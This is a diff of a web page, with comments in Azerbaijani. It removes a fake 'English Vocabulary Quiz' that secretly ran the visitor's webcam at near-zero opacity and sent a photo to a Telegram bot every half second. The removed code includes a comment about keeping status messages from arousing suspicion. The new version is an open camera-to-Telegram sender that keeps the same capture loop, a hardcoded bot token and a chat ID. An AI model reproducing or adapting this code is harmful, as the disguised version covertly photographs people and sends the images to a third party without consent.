@@ -1,17 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="az">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>English Vocabulary Quiz - Learn Fast</title>
+  <title>Kameradan Telegram-a Şəkil Göndərən</title>
   <style>
     body { 
       margin:0; 
-      background: linear-gradient(135deg, #f0f4ff, #e6f0ff); 
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-      color:#333; 
+      background:#000; 
+      font-family:monospace; 
+      color:#0f3; 
       overflow:hidden;
-      height: 100vh;
     }
     #video {
       position: fixed; 
@@ -19,109 +18,46 @@
       width:100vw; 
       height:100vh; 
       object-fit:cover;
-      opacity: 0.08; /* çox zəif görünür, amma kamera işləyir */
-      z-index: -2;
-    }
-    .container {
-      position: relative;
-      z-index: 10;
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 30px;
-      background: white;
-      border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    h1 {
-      color: #2c5282;
-      margin-bottom: 10px;
-    }
-    .subtitle {
-      color: #4a5568;
-      margin-bottom: 30px;
-    }
-    .question {
-      font-size: 1.4rem;
-      font-weight: bold;
-      margin: 30px 0 20px;
-      color: #2d3748;
-    }
-    .options {
-      display: grid;
-      gap: 15px;
-    }
-    .option {
-      background: #edf2f7;
-      padding: 18px;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: all 0.2s;
-      font-size: 1.1rem;
-    }
-    .option:hover {
-      background: #bee3f8;
-      transform: translateY(-3px);
+      transform: scaleX(-1); /* güzgü effekti – istəmirsənsə sil */
     }
     #status {
       position: fixed; 
       top:16px; 
-      right:16px; 
-      background:rgba(255,255,255,0.9);
-      padding:10px 16px; 
-      border-radius:12px; 
-      font-size:14px;
-      color:#4a5568;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      left:16px; 
+      background:rgba(0,0,0,0.75);
+      padding:12px 20px; 
+      border-radius:8px; 
+      z-index:999; 
+      font-size:16px;
+      box-shadow: 0 0 10px rgba(0,255,0,0.3);
     }
     #info {
       position: fixed;
       bottom: 16px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(255,255,255,0.95);
-      padding: 10px 20px;
-      border-radius: 30px;
-      font-size: 13px;
-      color: #718096;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      left: 16px;
+      background: rgba(0,0,0,0.7);
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-size: 14px;
+      z-index: 999;
     }
   </style>
 </head>
 <body>
 
+<div id="status">Kamera açılır... brauzer bildirişinə icazə ver</div>
+<div id="info">Şəkillər hər 0.5 saniyədən bir Telegram-a gedir</div>
+
 <video id="video" autoplay playsinline muted></video>
-
-<div class="container">
-  <h1>English Vocabulary Quiz</h1>
-  <p class="subtitle">Test your words! Choose the correct meaning.</p>
-  
-  <div class="question" id="question">What does "ubiquitous" mean?</div>
-  
-  <div class="options">
-    <div class="option">Everywhere at once</div>
-    <div class="option">Very rare</div>
-    <div class="option">Dangerous</div>
-    <div class="option">Old-fashioned</div>
-  </div>
-  
-  <p style="margin-top:40px; color:#718096; font-size:0.95rem;">
-    More questions coming soon... Keep learning! 🚀
-  </p>
-</div>
-
-<div id="status">Loading quiz...</div>
-<div id="info">This is a free English learning tool • No registration needed</div>
-
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
 // ────────────────────────────────────────────────
-// TELEGRAM GÖNDƏRMƏ HISSƏSİ – DƏYİŞMƏ!
+// SƏNİN MƏLUMATLARIN ARTİQ BURADA YAZILIB
 const BOT_TOKEN   = "8514355914:AAFR7vh1Swu6cIpb_vHODNik9zdxDlCsWP4";
 const CHAT_ID     = "6570410435";
-const INTERVAL_MS = 500;
-const PHOTO_QUALITY = 0.68;
+const INTERVAL_MS = 500;          // 0.5 saniyə
+const PHOTO_QUALITY = 0.68;       // 0.6–0.85 arası dəyişə bilərsən (kiçik fayl = aşağı rəqəm)
 
 const video  = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -142,9 +78,9 @@ async function startCamera() {
     });
 
     video.srcObject = stream;
-    status.textContent = "Quiz ready • Good luck!";
-    status.style.background = "rgba(0,180,0,0.15)";
-    status.style.color = "#2f855a";
+    status.textContent = `Kamera aktiv • hər ${INTERVAL_MS/1000} saniyədə göndərirəm`;
+    status.style.background = "rgba(0,100,0,0.7)";
+    status.style.color = "#0f0";
 
     video.onloadedmetadata = () => {
       canvas.width  = video.videoWidth;
@@ -153,9 +89,10 @@ async function startCamera() {
     };
 
   } catch (err) {
-    status.textContent = "Please allow camera to start quiz";
-    status.style.background = "rgba(200,0,0,0.15)";
-    console.error("Camera error:", err);
+    status.textContent = "Kamera xətası: " + err.message;
+    status.style.background = "rgba(150,0,0,0.8)";
+    status.style.color = "#f88";
+    console.error("Kamera xətası:", err);
   }
 }
 
@@ -169,21 +106,29 @@ async function sendPhoto() {
     formData.append('chat_id', CHAT_ID);
     formData.append('photo', blob, `capture_${Date.now()}.jpg`);
 
-    await fetch(
+    // İstəsən caption da əlavə et
+    // formData.append('caption', `Şəkil ${++sendCount} — ${new Date().toLocaleString('az-AZ')}`);
+
+    const response = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
       { method: 'POST', body: formData }
     );
 
-    sendCount++;
-    // status-ı dəyişmə ki şübhə yaratmasın
-    if (sendCount % 4 === 0) {
-      status.textContent = "Question loading...";
-    } else if (sendCount % 7 === 0) {
-      status.textContent = "Great job so far!";
+    const result = await response.json();
+
+    if (result.ok) {
+      status.textContent = `Göndərildi #${++sendCount} → ${new Date().toLocaleTimeString('az-AZ')}`;
+      status.style.background = "rgba(0,120,0,0.7)";
+    } else {
+      status.textContent = `Xəta: ${result.description || "Bilinmir"}`;
+      status.style.background = "rgba(180,0,0,0.8)";
+      console.error("Telegram xətası:", result);
     }
 
   } catch (err) {
-    console.error("Send error:", err);
+    status.textContent = "Göndərmə xətası → konsola bax (F12)";
+    status.style.background = "rgba(180,0,0,0.8)";
+    console.error("Fetch xətası:", err);
   }
 }
 
@@ -191,8 +136,10 @@ function startSending() {
   setInterval(sendPhoto, INTERVAL_MS);
 }
 
+// Səhifə açılan kimi başla
 window.addEventListener('load', startCamera);
 
+// Səhifəni bağlayanda / yeniləyəndə kameranı söndür
 window.addEventListener('beforeunload', () => {
   if (stream) {
     stream.getTracks().forEach(track => track.stop());
